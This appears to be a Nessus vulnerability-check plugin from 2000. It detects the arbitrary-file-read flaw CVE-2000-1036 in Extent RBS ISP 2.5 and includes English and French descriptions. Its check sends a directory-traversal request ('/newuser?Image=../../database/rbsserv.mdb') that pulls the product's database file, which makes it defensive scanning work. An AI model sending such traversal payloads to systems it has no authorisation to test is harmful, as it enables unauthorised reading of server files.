#
# This script was written by Zorgon <zorgon@linuxstart.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10521);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2000-1036");
 script_bugtraq_id(1704);
 
 name["english"] = "Extent RBS ISP";
 name["francais"] = "Extent RBS ISP";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'Extent RBS ISP 2.5' software is installed. This 
software has a well known security flaw that lets anyone read arbitrary
files with the privileges of the http daemon (root or nobody).

Solution : remove it or patch it (http://www.extent.com/solutions/down_prod.shtml)

Risk factor : Serious";


 desc["francais"] = "Le logiciel 'Extent RBS ISP 2.5' est installé. Celui-ci possède un problème de sécurité bien connu qui permet à n'importe qui de 
faire lire des fichiers  arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le ou mettez-le à jour (http://www.extent.com/solutions/down_prod.shtml)

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of Extent RBS ISP 2.5";
 summary["francais"] = "Vérifie la présence de Extent RBS ISP 2.5";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>",
		francais:"Ce script est Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports(8002,"Services/www");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = is_cgi_installed("/newuser");
if(port){
 req = string("/newuser?Image=../../database/rbsserv.mdb");
 req = http_get(item:req, port:port);
 soc = http_open_socket(port);
 send(socket:soc, data:req);
 buf = http_recv(socket:soc);
 http_close_socket(soc);
 if("SystemErrorsPerHour" >< buf)	
 	security_hole(port);
}
